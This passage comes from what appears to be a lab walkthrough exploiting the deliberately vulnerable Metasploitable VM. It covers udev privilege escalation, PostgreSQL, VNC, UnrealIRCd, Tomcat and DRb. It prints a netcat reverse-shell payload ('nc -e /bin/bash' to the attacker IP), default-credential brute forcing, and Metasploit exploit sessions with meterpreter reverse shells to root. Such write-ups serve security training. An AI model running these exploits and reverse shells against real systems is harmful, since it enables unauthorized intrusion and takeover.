</pre></td><td class='code'><pre><code class=''><span class='line'>gcc -m32 8572.c -o 8572
</span><span class='line'>nc -vv -l -p 5555 &lt; 8572</span></code></pre></td></tr></table></div></figure>


<p>From the victim, I go to the /tmp/ directory and grab the exploit from the attacking machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -n 192.168.127.159 5555 &gt; 8572</span></code></pre></td></tr></table></div></figure>


<p>Next, let&rsquo;s look for the PID:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /proc/net/netlink</span></code></pre></td></tr></table></div></figure>


<p>And the relevant line is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
</span><span class='line'>df8cc200 15  2767   00000001 0        0        00000000 2</span></code></pre></td></tr></table></div></figure>


<p>Check that this is the correct PID by looking at the udev service:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ps aux | grep udev
</span><span class='line'>root      2768  0.0  0.1   2092   620 ?        S&lt;s  14:11   0:00 /sbin/udevd --daemon</span></code></pre></td></tr></table></div></figure>


<p>It appears to be the right one (2768 &ndash; 1 = 2767)</p>

<p>Next, put some payload in /tmp/run, since that will be executed by the exploit. I will use netcat to connect to the atacker machine and give it a shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo '#!/bin/bash' &gt; /tmp/run
</span><span class='line'>echo 'nc -e /bin/bash 192.168.127.159 5555' &gt;&gt; /tmp/run</span></code></pre></td></tr></table></div></figure>


<p>On the attacker machine, listen on port 5555:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 5555</span></code></pre></td></tr></table></div></figure>


<p>And on the victim machine, now that all is set up, I just make the exploit executable and run it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chmod +x 8572
</span><span class='line'>./8572 2767</span></code></pre></td></tr></table></div></figure>


<p>Now check our local netcat listener for the root shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc: connect to 192.168.127.159 5555 from 192.168.127.154 (192.168.127.154) 35539 [35539]
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>A bit on effort on that one, but all the more rewarding! Let&rsquo;s move on.</p>

<h3>Port 5432 postgresql</h3>

<p>Since I already saw earlier that the mysql database wasn&rsquo;t password protected, I will try a bruteforce auxiliary module to see if I can get in this one.</p>

<p><strong>PostgreSQL Login Utility</strong></p>

<blockquote><p>This module attempts to authenticate against a PostgreSQL instance using username and password combinations indicated by the USER_FILE, PASS_FILE, and
USERPASS_FILE options.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/postgres/postgres_login
</span><span class='line'>msf auxiliary(postgres_login) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/scanner/postgres/postgres_login):
</span><span class='line'>
</span><span class='line'>   Name              Current Setting                                                             Required  Description
</span><span class='line'>   ----              ---------------                                                             --------  -----------
</span><span class='line'>   BLANK_PASSWORDS   false                                                                       no        Try blank passwords for all users
</span><span class='line'>   BRUTEFORCE_SPEED  5                                                                           yes       How fast to bruteforce, from 0 to 5
</span><span class='line'>   DATABASE          template1                                                                   yes       The database to authenticate against
</span><span class='line'>   DB_ALL_CREDS      false                                                                       no        Try each user/password couple stored in the current database
</span><span class='line'>   DB_ALL_PASS       false                                                                       no        Add all passwords in the current database to the list
</span><span class='line'>   DB_ALL_USERS      false                                                                       no        Add all users in the current database to the list
</span><span class='line'>   PASSWORD                                                                                      no        A specific password to authenticate with
</span><span class='line'>   PASS_FILE         /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
</span><span class='line'>   RETURN_ROWSET     true                                                                        no        Set to true to see query result sets
</span><span class='line'>   RHOSTS                                                                                        yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT             5432                                                                        yes       The target port
</span><span class='line'>   STOP_ON_SUCCESS   false                                                                       yes       Stop guessing when a credential works for a host
</span><span class='line'>   THREADS           1                                                                           yes       The number of concurrent threads
</span><span class='line'>   USERNAME          postgres                                                                    no        A specific username to authenticate as
</span><span class='line'>   USERPASS_FILE     /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
</span><span class='line'>   USER_AS_PASS      false                                                                       no        Try the username as the password for all users
</span><span class='line'>   USER_FILE         /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
</span><span class='line'>   VERBOSE           true                                                                        yes       Whether to print output for all attempts
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf auxiliary(postgres_login) &gt; set RHOSTS 192.168.127.154
</span><span class='line'>RHOSTS =&gt; 192.168.127.154
</span><span class='line'>msf auxiliary(postgres_login) &gt; set STOP_ON_SUCCESS true
</span><span class='line'>STOP_ON_SUCCESS =&gt; true
</span><span class='line'>msf auxiliary(postgres_login) &gt; run
</span><span class='line'>
</span><span class='line'>[*] 192.168.127.154:5432 Postgres - [01/20] - Trying username:'postgres' with password:'postgres' on database 'template1'
</span><span class='line'>[+] 192.168.127.154:5432 Postgres - Logged in to 'template1' with 'postgres':'postgres'
</span><span class='line'>[+] 192.168.127.154:5432 Postgres - Success: postgres:postgres (Database 'template1' succeeded.)
</span><span class='line'>[*] 192.168.127.154:5432 Postgres - Disconnected
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>So it&rsquo;s possible to log in to this database like earlier with mysql, but I searched through Metasploit&rsquo;s available exploits, and I stumbled upon one that can further the exploitation:</p>

<p><strong>PostgreSQL for Linux Payload Execution</strong></p>

<blockquote><p>On some default Linux installations of PostgreSQL, the postgres service account may write to the /tmp directory, and may source UDF Shared Libraries&rsquo;s
om there as well, allowing execution of arbitrary code. This module compiles a Linux shared object file, uploads it to the target host via the UPDATE
pg_largeobject method of binary injection, and creates a UDF (user defined function) from that shared object. Because the payload is run as the shared
object&rsquo;s constructor, it does not need to conform to specific Postgres API versions.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/linux/postgres/postgres_payload
</span><span class='line'>msf exploit(postgres_payload) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/linux/postgres/postgres_payload):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   DATABASE  template1        yes       The database to authenticate against
</span><span class='line'>   PASSWORD                   no        The password for the specified username. Leave blank for a random password.
</span><span class='line'>   RHOST                      yes       The target address
</span><span class='line'>   RPORT     5432             yes       The target port
</span><span class='line'>   USERNAME  postgres         yes       The username to authenticate as
</span><span class='line'>   VERBOSE   false            no        Enable verbose output
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Linux x86
</span><span class='line'>
</span><span class='line'>msf exploit(postgres_payload) &gt; set payload linux/x86/meterpreter/reverse_tcp
</span><span class='line'>payload =&gt; linux/x86/meterpreter/reverse_tcp
</span><span class='line'>msf exploit(postgres_payload) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>set PASSWORD postgres
</span><span class='line'>PASSWORD =&gt; postgres
</span><span class='line'>msf exploit(postgres_payload) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.127.159:4444 
</span><span class='line'>[*] 192.168.127.154:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
</span><span class='line'>[*] Uploaded as /tmp/uVhDfWDg.so, should be cleaned up automatically
</span><span class='line'>[*] Transmitting intermediate stager for over-sized stage...(100 bytes)
</span><span class='line'>[*] Sending stage (1228800 bytes) to 192.168.127.154
</span><span class='line'>[*] Meterpreter session 1 opened (192.168.127.159:4444 -&gt; 192.168.127.154:37141) at 2014-06-06 22:49:17 +0300</span></code></pre></td></tr></table></div></figure>


<p>From here we again have to elevate our privileges. I will exploit the same vulnerability with the udev exploit, but this time from inside Metasploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; background
</span><span class='line'>[*] Backgrounding session 1...
</span><span class='line'>msf exploit(postgres_payload) &gt; use exploit/linux/local/udev_netlink
</span><span class='line'>msf exploit(udev_netlink) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/linux/local/udev_netlink):
</span><span class='line'>
</span><span class='line'>   Name         Current Setting  Required  Description
</span><span class='line'>   ----         ---------------  --------  -----------
</span><span class='line'>   NetlinkPID                    no        Usually udevd pid-1.  Meterpreter sessions will autodetect
</span><span class='line'>   SESSION                       yes       The session to run this module on.
</span><span class='line'>   WritableDir  /tmp             yes       A directory where we can write files (must not be mounted noexec)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Linux x86
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(udev_netlink) &gt; set SESSION 1
</span><span class='line'>SESSION =&gt; 1
</span><span class='line'>msf exploit(udev_netlink) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.127.159:4444 
</span><span class='line'>[*] Attempting to autodetect netlink pid...
</span><span class='line'>[*] Meterpreter session, using get_processes to find netlink pid
</span><span class='line'>[*] udev pid: 2770
</span><span class='line'>[+] Found netlink pid: 2769
</span><span class='line'>[*] Writing payload executable (274 bytes) to /tmp/rzIcSWveTb
</span><span class='line'>[*] Writing exploit executable (1879 bytes) to /tmp/DQDnKUFLzR
</span><span class='line'>[*] chmod'ing and running it...
</span><span class='line'>[*] Command shell session 2 opened (192.168.127.159:4444 -&gt; 192.168.127.154:33383) at 2014-06-06 23:03:13 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>So, the same exploit that I manually used earlier was very easy and quick in Metasploit. Onwards!</p>

<h3>Port 5900 vnc</h3>

<p>The Nessus scan reported that the server is using the password &lsquo;password&rsquo;. So I will use vncviewer to connect to it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vncviewer 192.168.127.154
</span><span class='line'>Connected to RFB server, using protocol version 3.3
</span><span class='line'>Performing standard VNC authentication
</span><span class='line'>Password: 
</span><span class='line'>Authentication successful
</span><span class='line'>Desktop name "root's X desktop (metasploitable:0)"
</span><span class='line'>VNC server default format:
</span><span class='line'>  32 bits per pixel.
</span><span class='line'>  Least significant byte first in each pixel.
</span><span class='line'>  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
</span><span class='line'>Using default colormap which is TrueColor.  Pixel format:
</span><span class='line'>  32 bits per pixel.
</span><span class='line'>  Least significant byte first in each pixel.
</span><span class='line'>  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="/images/vnc.png" title="vnc shell" alt="vnc"></p>

<p>And we have another root shell.</p>

<h3>Port 6667 irc</h3>

<p>An exploit is available for this:</p>

<p><strong>UnrealIRCD 3.2.8.1 Backdoor Command Execution</strong></p>

<blockquote><p>This module exploits a malicious backdoor that was added to the Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the Unreal3.2.8.1.tar.gz
archive between November 2009 and June 12th 2010.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/unix/irc/unreal_ircd_3281_backdoor
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST                   yes       The target address
</span><span class='line'>   RPORT  6667             yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic Target
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; set payload cmd/unix/reverse 
</span><span class='line'>payload =&gt; cmd/unix/reverse
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] Connected to 192.168.127.154:6667...
</span><span class='line'>    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
</span><span class='line'>    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
</span><span class='line'>[*] Sending backdoor command...
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo qcHh6jsH8rZghWdi;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "qcHh6jsH8rZghWdi\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Command shell session 3 opened (192.168.127.159:4444 -&gt; 192.168.127.154:41975) at 2014-06-06 23:31:44 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<h3>Port 8180 tomcat</h3>

<p>First, let&rsquo;s see what information we can get using the <strong>Tomcat Administration Tool Default Access</strong> module:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/admin/http/tomcat_administration
</span><span class='line'>msf auxiliary(tomcat_administration) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/admin/http/tomcat_administration):
</span><span class='line'>
</span><span class='line'>   Name         Current Setting  Required  Description
</span><span class='line'>   ----         ---------------  --------  -----------
</span><span class='line'>   Proxies                       no        Use a proxy chain
</span><span class='line'>   RHOSTS                        yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT        8180             yes       The target port
</span><span class='line'>   THREADS      1                yes       The number of concurrent threads
</span><span class='line'>   TOMCAT_PASS                   no        The password for the specified username
</span><span class='line'>   TOMCAT_USER                   no        The username to authenticate as
</span><span class='line'>   VHOST                         no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>msf auxiliary(tomcat_administration) &gt; set RHOSTS 192.168.127.154
</span><span class='line'>RHOSTS =&gt; 192.168.127.154
</span><span class='line'>msf auxiliary(tomcat_administration) &gt; run
</span><span class='line'>
</span><span class='line'>[*] http://192.168.127.154:8180/admin [Apache-Coyote/1.1] [Apache Tomcat/5.5] [Tomcat Server Administration] [tomcat/tomcat]
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>With credentials in hand, now we can use the <strong>Apache Tomcat Manager Application Deployer Authenticated Code Execution</strong> exploit:</p>

<blockquote><p>This module can be used to execute a payload on Apache Tomcat servers that have an exposed &ldquo;manager&rdquo; application. The payload is uploaded as a WAR archive
containing a jsp application using a PUT request. The manager application can also be abused using /manager/html/upload, but that method is not implemented in > this module. NOTE: The compatible payload sets vary based on the selected target. For example, you must select the Windows target to use native Windows
payloads.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/http/tomcat_mgr_deploy
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/http/tomcat_mgr_deploy):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   PASSWORD                   no        The password for the specified username
</span><span class='line'>   PATH      /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
</span><span class='line'>   Proxies                    no        Use a proxy chain
</span><span class='line'>   RHOST                      yes       The target address
</span><span class='line'>   RPORT     80               yes       The target port
</span><span class='line'>   USERNAME                   no        The username to authenticate as
</span><span class='line'>   VHOST                      no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set PASSWORD tomcat
</span><span class='line'>PASSWORD =&gt; tomcat
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set USERNAME tomcat
</span><span class='line'>USERNAME =&gt; tomcat
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set PASSWORD tomcat
</span><span class='line'>PASSWORD =&gt; tomcat
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set USERNAME tomcat
</span><span class='line'>USERNAME =&gt; tomcat
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set RPORT 8180
</span><span class='line'>RPORT =&gt; 8180
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set payload  java/meterpreter/reverse_tcp
</span><span class='line'>payload =&gt; java/meterpreter/reverse_tcp
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.127.159:8888 
</span><span class='line'>[*] Attempting to automatically select a target...
</span><span class='line'>[*] Automatically selected target "Linux x86"
</span><span class='line'>[*] Uploading 13833 bytes as RuoE02Uo7DeSsaVp7nmb79cq.war ...
</span><span class='line'>[*] Executing /RuoE02Uo7DeSsaVp7nmb79cq/19CS3RJj.jsp...
</span><span class='line'>[*] Undeploying RuoE02Uo7DeSsaVp7nmb79cq ...
</span><span class='line'>[*] Command shell session 4 opened (192.168.127.159:8888 -&gt; 192.168.127.154:33966) at 2014-06-06 23:51:01 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>tomcat55</span></code></pre></td></tr></table></div></figure>


<p>We can elevate our privileges using the udev exploit from earlier, so I won&rsquo;t go over it again.</p>

<h3>Port 8787 drb</h3>

<p>First I wanted to know what this drb is, since I wasn&rsquo;t familiar with it.</p>

<blockquote><p>Distributed Ruby or DRb allows Ruby programs to communicate with each other on the same machine or over a network. DRb uses remote method
invocation (RMI) to pass commands and data between processes (Wikipedia)</p></blockquote>

<p>Then I searched in Metasploit for an exploit, and luckily, I got a hit:</p>

<p><strong>Distributed Ruby Send instance_eval/syscall Code Execution</strong></p>

<blockquote><p>This module exploits remote code execution vulnerabilities in dRuby</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
